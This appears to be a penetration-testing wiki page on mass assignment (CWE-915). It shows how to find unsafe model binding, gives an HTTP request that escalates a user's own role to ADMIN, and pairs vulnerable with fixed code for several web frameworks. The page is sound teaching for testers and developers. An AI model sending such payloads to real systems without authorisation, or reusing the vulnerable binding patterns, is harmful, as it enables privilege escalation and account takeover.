# Mass Assignment (CWE-915) – Privilege Escalation via Unsafe Model Binding

{{#include ../banners/hacktricks-training.md}}

Mass assignment (a.k.a. insecure object binding) happens when an API/controller takes user-supplied JSON and directly binds it to a server-side model/entity without an explicit allow-list of fields. If privileged properties like roles, isAdmin, status, or ownership fields are bindable, any authenticated user can escalate privileges or tamper with protected state.

This is a Broken Access Control issue (OWASP A01:2021) that often enables vertical privilege escalation by setting roles=ADMIN or similar. It commonly affects frameworks that support automatic binding of request bodies to data models (Rails, Laravel/Eloquent, Django ORM, Spring/Jackson, Express/Mongoose, Sequelize, Go structs, etc.).

## 1) Finding Mass Assignment

Look for self-service endpoints that update your own profile or similar resources:
- PUT/PATCH /api/users/{id}
- PATCH /me, PUT /profile
- PUT /api/orders/{id}

Heuristics indicating mass assignment:
- The response echoes server-managed fields (e.g., roles, status, isAdmin, permissions) even when you didn’t send them.
- Client bundles contain role names/IDs or other privileged attribute names used throughout the app (admin, staff, moderator, internal flags), hinting bindable schema.
- Backend serializers accept unknown fields without rejecting them.

Quick test flow:
1) Perform a normal update with only safe fields and observe the full JSON response structure (this leaks the schema).
2) Repeat the update including a crafted privileged field in the body. If the response persists the change, you likely have mass assignment.

Example baseline update revealing schema:
```http
PUT /api/users/12934 HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "id": 12934,
  "email": "user@example.com",
  "firstName": "Sam",
  "lastName": "Curry"
}
```
Response hints at privileged fields:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 12934,
  "email": "user@example.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "roles": null,
  "status": "ACTIVATED",
  "filters": []
}
```


## 2) Exploitation – Role Escalation via Mass Assignment

Once you know the bindable shape, include the privileged property in the same request.

Example: set roles to ADMIN on your own user resource:
```http
PUT /api/users/12934 HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "id": 12934,
  "email": "user@example.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "roles": [
    { "id": 1, "description": "ADMIN role", "name": "ADMIN" }
  ]
}
```
If the response persists the role change, re-authenticate or refresh tokens/claims so the app issues an admin-context session and shows privileged UI/endpoints.

Notes
- Role identifiers and shapes are frequently enumerated from the client JS bundle or API docs. Search for strings like "roles", "ADMIN", "STAFF", or numeric role IDs.
- If tokens contain claims (e.g., JWT roles), a logout/login or token refresh is usually required to realize the new privileges.


## 3) Client Bundle Recon for Schema and Role IDs

- Inspect minified JS bundles for role strings and model names; source maps may reveal DTO shapes.
- Look for arrays/maps of roles, permissions, or feature flags. Build payloads matching the exact property names and nesting.
- Typical indicators: role name constants, dropdown option lists, validation schemas.

Handy greps against a downloaded bundle:
```bash
strings app.*.js | grep -iE "role|admin|isAdmin|permission|status" | sort -u
```


## 4) Framework Pitfalls and Secure Patterns

The vulnerability arises when frameworks bind req.body directly onto persistent entities. Below are common mistakes and minimal, secure patterns.

**Node.js (Express + Mongoose)**

Vulnerable:
```js
// Any field in req.body (including roles/isAdmin) is persisted
app.put('/api/users/:id', async (req, res) => {
  const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true });
  res.json(user);
});
```
Fix:
```js
// Strict allow-list and explicit authZ for role-changing
app.put('/api/users/:id', async (req, res) => {
  const allowed = (({ firstName, lastName, nickName }) => ({ firstName, lastName, nickName }))(req.body);
  const user = await User.findOneAndUpdate({ _id: req.params.id, owner: req.user.id }, allowed, { new: true });
  res.json(user);
});
// Implement a separate admin-only endpoint for role updates with server-side RBAC checks.
```

**Ruby on Rails**

Vulnerable (no strong parameters):
```rb
def update
  @user.update(params[:user]) # roles/is_admin can be set by client
end
```
Fix (strong params + no privileged fields):
```rb
def user_params
  params.require(:user).permit(:first_name, :last_name, :nick_name)
end
```

**Laravel (Eloquent)**

Vulnerable:
```php
protected $guarded = []; // Everything mass-assignable (bad)
```
Fix:
```php
protected $fillable = ['first_name','last_name','nick_name']; // No roles/is_admin
```

**Spring Boot (Jackson)**

Vulnerable pattern:
```java
// Directly binding to entity and persisting it
public User update(@PathVariable Long id, @RequestBody User u) { return repo.save(u); }
```
Fix: Map to a DTO with only allowed fields and enforce authorization:
```java
record UserUpdateDTO(String firstName, String lastName, String nickName) {}
```
Then copy allowed fields from DTO to the entity server-side, and handle role changes only in admin-only handlers after RBAC checks. Use @JsonIgnore on privileged fields if necessary and reject unknown properties.

Go (encoding/json)
- Ensure privileged fields use json:"-" and validate with a DTO struct that includes only allowed fields.
- Consider decoder.DisallowUnknownFields() and post-bind validation of invariants (roles cannot change in self-service routes).

## References

- [FIA Driver Categorisation: Admin Takeover via Mass Assignment of roles (Full PoC)](https://ian.sh/fia)
- [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)

{{#include ../banners/hacktricks-training.md}}
